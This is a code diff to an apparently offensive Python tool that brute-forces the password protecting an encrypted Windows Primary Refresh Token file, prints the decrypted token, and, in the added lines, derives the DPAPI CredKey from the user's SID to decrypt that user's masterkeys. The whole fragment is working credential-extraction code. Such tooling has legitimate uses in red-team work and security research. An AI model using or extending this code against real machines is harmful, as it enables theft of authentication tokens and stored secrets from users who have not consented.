@@ -1,4 +1,6 @@
 import json
+import hmac
+import hashlib
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -50,6 +52,12 @@ def bruteforce(arguments):
             print("[+] Dumping decrypted PRT file:")
             prt_dict = json.loads(decrypted_prt)
             print(json.dumps(prt_dict, indent=4))
+            # Derive the CredKey. Serves as the base secret to decrypt the masterkeys of the user.
+            key = hashlib.sha1(dpapi_cred_key_blob_obj.CredKey).digest()
+            sid = prt_dict['UserInfo']['PrimarySid']
+            encoded_sid = (sid + '\0').encode('UTF-16-LE')
+            key = hmac.new(key, encoded_sid, hashlib.sha1).hexdigest()
+            print(f'[+] Derived CredKey: {key} for sid: {sid}')
             break
     if not success:
         print('[+] End of bruteforce, no valid password found.')
